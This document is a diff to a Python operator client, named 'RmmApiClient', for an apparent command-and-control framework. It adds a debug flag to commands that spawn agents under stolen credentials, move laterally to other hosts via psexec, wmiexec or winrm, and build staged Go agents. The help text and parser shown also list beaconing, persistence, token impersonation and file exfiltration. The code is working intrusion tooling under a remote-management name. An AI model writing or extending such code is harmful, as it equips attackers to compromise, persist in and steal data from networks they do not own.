@@ -198,6 +198,7 @@ class RmmApiClient:
         spawn_timeout: float = 120,
         register_timeout: float = 60,
         verify_timeout: float = 120,
+        debug: bool = False,
     ):
         return self.request(
             "POST",
@@ -207,6 +208,7 @@ class RmmApiClient:
                 "spawn_timeout": spawn_timeout,
                 "register_timeout": register_timeout,
                 "verify_timeout": verify_timeout,
+                "debug": debug,
             },
             # Worst case: spawn wait + registration wait + two verification waits.
             timeout=spawn_timeout + register_timeout + 2 * verify_timeout + 30,
@@ -237,6 +239,7 @@ class RmmApiClient:
         exec_timeout: float = 300,
         register_timeout: float = 60,
         verify_timeout: float = 120,
+        debug: bool = False,
     ):
         return self.request(
             "POST",
@@ -248,6 +251,7 @@ class RmmApiClient:
                 "exec_timeout": exec_timeout,
                 "register_timeout": register_timeout,
                 "verify_timeout": verify_timeout,
+                "debug": debug,
             },
             # Worst case: lateral execution wait + registration + two verifications.
             timeout=exec_timeout + register_timeout + 2 * verify_timeout + 30,
@@ -278,9 +282,10 @@ class RmmApiClient:
     def spawnas(self, session_id: str, cred_id: str = "", domain: str = "",
                 user: str = "", password: str = "", verify: bool = True,
                 spawn_timeout: float = 120, register_timeout: float = 60,
-                verify_timeout: float = 120):
+                verify_timeout: float = 120, debug: bool = False):
         body: dict = {"verify": verify, "spawn_timeout": spawn_timeout,
-                      "register_timeout": register_timeout, "verify_timeout": verify_timeout}
+                      "register_timeout": register_timeout, "verify_timeout": verify_timeout,
+                      "debug": debug}
         if cred_id:
             body["cred_id"] = cred_id
         else:
@@ -619,12 +624,13 @@ class RmmApiClient:
             timeout=60,
         )
 
-    def build_go_agent(self, goos="windows", goarch="amd64", config=None, use_server_config=True, stageless=False):
+    def build_go_agent(self, goos="windows", goarch="amd64", config=None, use_server_config=True, stageless=False, debug=False):
         """Build the repository Go agent; use_server_config embeds the active URL and secret."""
         return self.request(
             "POST",
             "/api/v1/agent/go/build",
-            {"goos": goos, "goarch": goarch, "config": config or {}, "use_server_config": use_server_config, "stageless": bool(stageless)},
+            {"goos": goos, "goarch": goarch, "config": config or {}, "use_server_config": use_server_config,
+             "stageless": bool(stageless or debug), "debug": debug},
             timeout=180,
         )
 
@@ -982,6 +988,7 @@ def cmd_spawn(client: RmmApiClient, state: dict, args):
         spawn_timeout=args.spawn_timeout,
         register_timeout=args.register_timeout,
         verify_timeout=args.verify_timeout,
+        **({"debug": True} if getattr(args, "debug", False) else {}),
     )
     if args.json:
         print_json(data)
@@ -1155,7 +1162,8 @@ def cmd_spawnas(client: RmmApiClient, state: dict, args):
                                 password=password, verify=verify,
                                 spawn_timeout=getattr(args, "spawn_timeout", 120),
                                 register_timeout=getattr(args, "register_timeout", 60),
-                                verify_timeout=getattr(args, "verify_timeout", 120))
+                                verify_timeout=getattr(args, "verify_timeout", 120),
+                                debug=getattr(args, "debug", False))
     if args.json:
         print_json(data)
         if code != 200 or (isinstance(data, dict) and not data.get("ok") and not data.get("pending")):
@@ -1203,6 +1211,8 @@ def cmd_runas(client: RmmApiClient, state: dict, args):
 
 def cmd_lateral(client: RmmApiClient, state: dict, args):
     sid = require_session(state, args.session)
+    if not args.host.strip() or args.host.startswith("-"):
+        die("A target hostname or IP address is required", 1)
     say(f"Lateral {args.method} to {args.host} (waits for the next beacon)...", err=True)
     code, data = client.lateral_move(
         sid,
@@ -1212,6 +1222,7 @@ def cmd_lateral(client: RmmApiClient, state: dict, args):
         exec_timeout=args.exec_timeout,
         register_timeout=args.register_timeout,
         verify_timeout=args.verify_timeout,
+        **({"debug": True} if getattr(args, "debug", False) else {}),
     )
     if args.json:
         print_json(data)
@@ -1488,6 +1499,7 @@ def cmd_agent(client: RmmApiClient, state: dict, args):
             **({"config": {"workspace_id": args.workspace_id}} if getattr(args, "workspace_id", None) else {}),
             use_server_config=not getattr(args, "no_server_config", False),
             stageless=getattr(args, "stageless", False),
+            debug=getattr(args, "debug", False),
         )
     elif action == "go-stage":
         code, data = client.stage_status(args.staging_id)
@@ -1663,12 +1675,12 @@ def _show_help():
 Session:  /list | /use <id> | /info | /background | /kill [id]
 Beacon:   /set_sleep <seconds> | /set_jitter <percent> | /show_config
 Remote:   <command> or /run <command>  (queue) | /exec <command>  (wait) | /persist <cmd> | /stop
-Spawn:    /spawn [id]   (detached second Go agent, same identity)
-          /spawnas -i <cred_id>   (spawn under different identity, CreateProcessAsUser cascade)
+Spawn:    /spawn [-d|--debug] [id]   (same identity; -d requires the installed debug companion)
+          /spawnas -i <cred_id> [-d|--debug]   (spawn under different identity; -d selects installed debug companion)
           /runas -i <cred_id> <command>   (run command under different identity)
 Creds:    /creds list | /creds add <domain\\user | user> <password> | /creds del -i <cred_id>
 Identity: /make_token -i <cred_id> | /make_token <domain\\user | user> <password>  (runas /netonly style) | /rev2self | /uid
-Lateral:  /lateral <psexec|wmiexec|winrm> <host>   (start a Go agent on another host)
+Lateral:  /lateral <psexec|wmiexec|winrm> <host> [-d|--debug]   (-d deploys a separate debug agent: server artifact for psexec; source companion for wmiexec/winrm)
 Files:    /download <remote> | /exfil <remote> [profile] | /upload <local> <remote> | /screenshot
 Plugins: /pe list | /pe <plugin> [export] [input]   (isolated PE load; marked DLLs use a temporary file)
 Config:   /rclone-config   (rclone profiles + bootstrap status)
@@ -2168,15 +2180,20 @@ def run_interactive(
                     warn(f"failed ({code})")
                 continue
             if cmd == "spawn":
-                sid_arg = rest[0] if rest else None
+                flags = [arg for arg in rest if arg in ("-d", "--debug")]
+                arguments = [arg for arg in rest if arg not in ("-d", "--debug")]
+                if len(flags) > 1 or len(arguments) > 1 or any(arg.startswith("-") for arg in arguments):
+                    warn("Usage: /spawn [-d|--debug] [session_id]")
+                    continue
+                sid_arg = arguments[0] if arguments else None
                 sid = session_or_none(state, sid_arg)
                 if not sid and sid_arg:
                     sid = _resolve_session_id(client, state, sid_arg)
                 if not sid:
-                    warn("No session to spawn from. Use: /spawn [session_id]")
+                    warn("No session to spawn from. Use: /spawn [-d|--debug] [session_id]")
                     continue
                 say("Spawning detached Go agent (waits for the next beacon)...")
-                code, data = client.spawn_session(sid)
+                code, data = client.spawn_session(sid, **({"debug": True} if flags else {}))
                 if code != 200:
                     detail = data.get("error") if isinstance(data, dict) else data
                     warn(f"spawn failed ({code})" + (f": {detail}" if detail else ""))
@@ -2236,16 +2253,20 @@ def run_interactive(
                     say(data.get("output") or "token reverted")
                 continue
             if cmd == "lateral":
-                if len(rest) != 2:
-                    warn("Usage: /lateral <psexec|wmiexec|winrm> <host>")
+                flags = [arg for arg in rest if arg in ("-d", "--debug")]
+                arguments = [arg for arg in rest if arg not in ("-d", "--debug")]
+                if (len(flags) > 1 or len(arguments) != 2 or
+                        arguments[0].lower() not in ("psexec", "wmiexec", "winrm") or
+                        any(arg.startswith("-") for arg in arguments)):
+                    warn("Usage: /lateral <psexec|wmiexec|winrm> <host> [-d|--debug]")
                     continue
                 sid = session_or_none(state)
                 if not sid:
                     warn("No session selected")
                     continue
-                method, host = rest[0].lower(), rest[1]
+                method, host = arguments[0].lower(), arguments[1]
                 say(f"Lateral {method} to {host} (waits for the next beacon)...")
-                code, data = client.lateral_move(sid, method, host)
+                code, data = client.lateral_move(sid, method, host, **({"debug": True} if flags else {}))
                 if code != 200:
                     detail = data.get("error") if isinstance(data, dict) else data
                     warn(f"lateral failed ({code})" + (f": {detail}" if detail else ""))
@@ -2331,11 +2352,18 @@ def run_interactive(
                 except ValueError:
                     warn("Invalid quoting")
                     continue
+                debug = False
+                if rest and rest[0] in ("-d", "--debug"):
+                    debug, rest = True, rest[1:]
+                elif len(rest) == 3 and rest[-1] in ("-d", "--debug"):
+                    debug, rest = True, rest[:-1]
                 try:
                     options, _ = parse_credential_arguments(rest)
                 except ValueError:
-                    warn("Usage: /spawnas -i <cred_id> | /spawnas <identity> <password>")
+                    warn("Usage: /spawnas [-d|--debug] -i <cred_id> | /spawnas [-d|--debug] <identity> <password>")
                     continue
+                if debug:
+                    options["debug"] = True
                 sid = session_or_none(state)
                 if not sid:
                     warn("No session selected")
@@ -2817,6 +2845,7 @@ def build_parser() -> argparse.ArgumentParser:
         help="Spawn a detached second Go agent from a live Go session and confirm the new session registration",
     )
     sp_spawn.add_argument("--session", "-s", default=None)
+    sp_spawn.add_argument("-d", "--debug", action="store_true", help="Launch the separate debug companion installed beside the source agent")
     sp_spawn.add_argument("--no-verify", action="store_true", help="Skip checks and report an unconfirmed request, not deployment success")
     sp_spawn.add_argument("--spawn-timeout", type=float, default=120, help="Seconds to wait for the spawn command result")
     sp_spawn.add_argument("--register-timeout", type=float, default=60, help="Seconds to wait for the spawned session to register")
@@ -2866,6 +2895,7 @@ def build_parser() -> argparse.ArgumentParser:
     sp_spawnas.add_argument("--password", default=None, help="Password (if no cred_id)")
     sp_spawnas.add_argument("--session", "-s", default=None)
     sp_spawnas.add_argument("--no-verify", dest="no_verify", action="store_true")
+    sp_spawnas.add_argument("-d", "--debug", action="store_true", help="Launch the separate debug companion installed beside the source agent")
     sp_spawnas.add_argument("--spawn-timeout", type=float, default=120)
     sp_spawnas.add_argument("--register-timeout", type=float, default=60)
     sp_spawnas.add_argument("--verify-timeout", type=float, default=120)
@@ -2892,6 +2922,7 @@ def build_parser() -> argparse.ArgumentParser:
     sp_lat.add_argument("method", choices=["psexec", "wmiexec", "winrm"])
     sp_lat.add_argument("host", help="Target hostname or IP address")
     sp_lat.add_argument("--session", "-s", default=None)
+    sp_lat.add_argument("-d", "--debug", action="store_true", help="Deploy a separate debug agent: server-built for psexec; source companion required for wmiexec/winrm")
     sp_lat.add_argument("--no-verify", action="store_true", help="Skip checks and report an unconfirmed request, not deployment success")
     sp_lat.add_argument("--exec-timeout", type=float, default=300, help="Seconds to wait for the lateral execution result")
     sp_lat.add_argument("--register-timeout", type=float, default=60, help="Seconds to wait for the target session to register")
@@ -3023,6 +3054,7 @@ def build_parser() -> argparse.ArgumentParser:
     sp_agent_go.add_argument("--goarch", default="amd64", choices=["amd64", "arm64"])
     sp_agent_go.add_argument("--no-server-config", action="store_true", help="Build a generic agent without embedded connection settings")
     sp_agent_go.add_argument("--stageless", action="store_true", help="Embed the Go agent directly in the ZIP instead of staging it. Default: return a small stage1 launcher (~20 KB) that fetches the agent from the server at runtime.")
+    sp_agent_go.add_argument("--debug", action="store_true", help="Build a separate diagnostic executable in a full-agent ZIP; normal builds exclude diagnostics")
     sp_agent_go.add_argument("--workspace-id", help="Administrator-selected owner; workspace authentication binds this automatically")
     sp_agent_go.set_defaults(func=cmd_agent)
     sp_agent_stage = sp_agent_sub.add_parser(
